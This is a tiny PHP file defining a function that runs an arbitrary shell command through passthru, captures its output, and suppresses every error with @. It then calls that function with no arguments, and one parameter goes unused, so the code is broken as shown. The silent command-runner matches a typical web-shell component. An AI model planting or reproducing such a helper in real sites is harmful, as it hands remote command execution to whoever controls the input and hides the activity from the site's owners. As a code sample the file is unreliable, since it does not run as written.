<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	@ob_start();	
	@passthru($cmd); 
	$res = @ob_get_contents();	
	@ob_end_clean();
	return $res;
}

do_phpfun();
?>